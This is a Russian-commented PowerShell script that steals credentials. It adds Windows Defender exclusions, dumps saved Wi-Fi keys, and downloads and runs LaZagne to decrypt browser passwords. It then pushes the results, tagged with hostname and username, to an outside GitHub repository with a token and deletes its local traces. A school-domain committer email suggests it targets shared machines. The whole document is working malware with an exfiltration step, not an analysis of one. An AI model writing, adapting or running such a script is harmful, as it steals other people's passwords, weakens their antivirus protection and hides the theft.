# =============================================
# WiFi + Browser Passwords v2.4 (с исключением Defender)
# =============================================

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ Запусти от имени администратора!" -ForegroundColor Red
    exit 1
}

$RepoUrl = "https://github.com/DilanBlue/wifi.git"
$Token   = $env:GH_TOKEN

if (-not $Token) {
    Write-Host "❌ GH_TOKEN не передан!" -ForegroundColor Red
    exit 1
}

$exportDir = "C:\WiFiExport"
$hostname = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$filePath = Join-Path $exportDir "${hostname}_${timestamp}.txt"

New-Item -ItemType Directory -Force -Path $exportDir | Out-Null

# ====================== ИСКЛЮЧЕНИЕ WINDOWS DEFENDER ======================
Write-Host "🛡️ Добавляем исключение в Windows Defender..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath $exportDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "lz.exe" -ErrorAction SilentlyContinue
    Write-Host "✅ Исключение Defender добавлено" -ForegroundColor Green
} catch {
    Write-Host "⚠️ Не удалось добавить исключение Defender" -ForegroundColor Yellow
}

Write-Host "🔍 Извлекаем Wi-Fi и пароли браузеров..." -ForegroundColor Cyan

$oldEncoding = [Console]::OutputEncoding
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ====================== WI-FI ======================
$profiles = (netsh wlan show profiles) | Select-String ':\s+(.+?)\s*$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$results = @()
$foundWiFi = 0

foreach ($p in $profiles) {
    if (-not $p) { continue }
    $info = netsh wlan show profile name="$p" key=clear
    $pass = "НЕ НАЙДЕН"
    $match = $info | Select-String "(Содержимое ключа|Key Content)[\s:]+(.+)"
    if ($match) {
        $pass = $match.Matches.Groups[2].Value.Trim()
        if ($pass.Length -gt 3) { $foundWiFi++ }
    }
    $results += "=== WI-FI ==="
    $results += "SSID     : $p"
    $results += "Пароль   : $pass"
    $results += "----------------------------------------"
}

# ====================== BROWSERS (LaZagne) ======================
Write-Host "🔓 Расшифровываем пароли браузеров..." -ForegroundColor Yellow

$browserResults = @()

try {
    $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
    $lazagnePath = Join-Path $exportDir "lz.exe"
    
    Invoke-WebRequest -Uri $lazagneUrl -OutFile $lazagnePath -UseBasicParsing

    $output = & $lazagnePath browsers -quiet 2>$null
    
    if ($output) {
        $browserResults += "=== BROWSER PASSWORDS ==="
        $browserResults += $output
    } else {
        $browserResults += "LaZagne: Пароли не найдены или браузеры открыты."
    }
} catch {
    $browserResults += "Ошибка LaZagne: $($_.Exception.Message)"
}

$results += $browserResults

[Console]::OutputEncoding = $oldEncoding

# ====================== HEADER + SAVE ======================
$header = @"
FULL DUMP v2.4 - $hostname
========================================
Hostname     : $hostname
Пользователь : $env:USERNAME
Дата         : $(Get-Date)
WiFi паролей : $foundWiFi
========================================
"@

$header + ($results -join "`n") | Out-File -Encoding UTF8 -FilePath $filePath

Write-Host "✅ Готово! Wi-Fi: $foundWiFi" -ForegroundColor Green

# ====================== PUSH TO GITHUB ======================
try {
    $repoDir = Join-Path $exportDir "repo"
    if (!(Test-Path $repoDir)) { git clone $RepoUrl $repoDir }

    Copy-Item $filePath $repoDir -Force

    Push-Location $repoDir
    git config user.name "WiFi-Exporter"
    git config user.email "exporter@school.local"
    git add "*.txt"
    git commit -m "Full dump $hostname $timestamp" 2>$null
    git push "https://$Token@github.com/DilanBlue/wifi.git" main 2>$null
} finally {
    Pop-Location
}

# ====================== ФИНАЛЬНАЯ ОЧИСТКА ======================
Write-Host "🧹 Очистка следов..." -ForegroundColor Gray
Remove-Item $exportDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "🎉 Операция завершена!" -ForegroundColor Green
